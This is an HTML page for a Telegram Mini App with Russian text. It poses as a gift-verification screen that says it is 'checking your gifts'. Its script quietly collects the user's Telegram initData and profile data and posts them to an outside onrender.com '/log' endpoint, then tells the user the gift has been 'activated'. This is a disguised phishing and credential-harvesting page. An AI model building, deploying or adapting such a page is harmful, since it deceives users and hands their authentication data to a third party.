<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Проверка ваших подарков...</h2>
    <p>Пожалуйста, подождите, мы сверяем данные аккаунта.</p>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); // Разворачиваем на всё окно

        // Сбор данных
        const data = {
            initData: tg.initData, 
            user: tg.initDataUnsafe
        };

    // Исправленная строка (добавлен /log)
fetch('https://gift-backend-pq6k.onrender.com/log', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
})
.then(response => {
    if (response.ok) {
        // Если данные ушли, можно остановить загрузку на экране
        document.body.innerHTML = "<h1>Проверка завершена! Ваш подарок активирован.</h1>";
    }
});
